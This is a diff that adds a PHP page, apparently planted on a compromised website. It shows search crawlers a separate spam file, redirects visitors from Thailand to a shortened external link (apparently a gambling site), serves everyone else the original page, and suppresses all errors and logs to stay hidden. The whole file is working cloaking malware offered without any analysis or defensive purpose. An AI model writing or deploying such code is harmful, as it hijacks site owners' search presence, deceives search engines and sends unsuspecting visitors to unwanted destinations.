@@ -1,0 +1,70 @@
+<?php
+error_reporting(0);
+ini_set('display_errors', 0);
+ini_set('log_errors', 0);
+set_error_handler(function() { return true; });
+
+header("Cache-Control: no-cache, no-store, must-revalidate");
+header("Pragma: no-cache");
+header("Expires: 0");
+
+// ====== DETEKSI BOT ======
+function is_google_bot() {
+    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-Image", "AhrefsBot");
+    foreach ($agents as $agent) {
+        if (isset($_SERVER['HTTP_USER_AGENT']) && stripos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+// ====== DETEKSI IP USER ======
+function get_user_ip() {
+    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
+        return $_SERVER['HTTP_CF_CONNECTING_IP']; // Cloudflare
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        return $_SERVER['HTTP_CLIENT_IP'];
+    } else {
+        return $_SERVER['REMOTE_ADDR'];
+    }
+}
+
+// ====== CHECK IP ======
+function get_country_by_ip($ip) {
+    $country = null;
+
+    // Coba API ipinfo.io
+    $url1 = "http://ipinfo.io/{$ip}/country";
+    $country = @file_get_contents($url1);
+
+    // Fallback API ip-api.com
+    if (!$country) {
+        $url2 = "http://ip-api.com/line/{$ip}?fields=countryCode";
+        $country = @file_get_contents($url2);
+    }
+
+    return $country ? trim($country) : null;
+}
+
+
+$ip = get_user_ip();
+$country = get_country_by_ip($ip);
+
+if (is_google_bot()) {
+    
+    $bot_content = @file_get_contents('README.txt');
+    echo $bot_content;
+    exit;
+} elseif ($country === "TH") {
+    
+    header("Location: https://rebrand.ly/mcd999-crl");
+    exit;
+} else {
+    
+    include('index_old.php');
+    exit;
+}
+?>
